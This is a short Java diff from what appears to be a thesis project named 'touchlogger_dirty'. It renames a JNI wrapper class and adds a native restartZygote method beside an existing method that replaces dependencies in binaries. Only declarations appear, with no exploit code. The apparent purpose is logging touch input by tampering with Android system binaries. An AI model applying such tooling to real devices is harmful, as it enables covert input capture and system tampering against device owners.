@@ -4,7 +4,7 @@ package org.leyfer.thesis.touchlogger_dirty.utils;
  * Created by kirill on 18.03.17.
  */
 
-public class NativeUtils {
+public class JNIAPI {
 
     /**
      * A native method that is implemented by the 'native-lib' native library,
@@ -54,4 +54,6 @@ public class NativeUtils {
      * @return True on success, false otherwise.
      */
     public static native boolean replaceDependencyInBinary(String path, String oldDependency, String newDependency);
+
+    public static native void restartZygote(String garbagePath, String backupPath);
 }
